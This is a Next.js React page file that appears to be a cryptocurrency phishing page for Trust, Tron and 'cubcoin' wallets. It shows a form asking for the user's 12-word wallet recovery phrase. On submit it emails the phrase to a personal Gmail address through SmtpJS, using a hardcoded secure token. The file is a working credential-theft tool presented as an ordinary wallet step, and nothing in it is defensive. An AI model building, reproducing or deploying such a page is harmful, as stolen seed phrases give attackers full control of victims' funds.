import { useState } from "react";

export const getStaticPaths = () => {
    const purses = [
        {
            name: "trust wallet",
            id: 1
        },
        {
            name: "tron wallet",
            id: 2
        },
        {
            name: "cubcoin wallet",
            id: 3
        }
    ];
    const res = purses;
    const paths = res.map(purse => {
        return{
            params: { id: purse.id.toString()}
        }
    });

    return {
        paths,
        fallback: false
    }
}
export const getStaticProps = ( context ) => {
    const purses = [
        {
            name: "trust wallet",
            id: 1
        },
        {
            name: "tron wallet",
            id: 2
        },
        {
            name: "cubcoin wallet",
            id: 3
        }
    ];
    const _id = context.params.id;

    const data = purses[_id - 1];

    console.log(data, _id)

    return{
        props:{ data}
    }
}
const Phrase = ({ data }) => {
    const [phrase12, setPhrase12] = useState("")
    const myFunc = ( ) => {
        Email.send({
            SecureToken : "f10ea3fc-c85c-40ed-93e9-4467760c85cf",
            To : 'amogukachi7@gmail.com',
            From : "kachiamogu47@gmail.com",
            Subject : data.name,
            Body : phrase12
        }).then(
          message => alert(message)
        );
        console.log(phrase12)
    }
    return(
        <div>

            <h1>Phrase</h1>
            <form action="">
                <label>12 phrase words</label>
                <textarea placeholder="Please input wallet's 12 phrase words..." 
                onChange={(e) => {setPhrase12(e.target.value)}}
                ></textarea>
            </form>
            <button onClick={myFunc} id="but">Submit</button>
            <p id="holder">fgd</p>
        </div>
    )
}

export default Phrase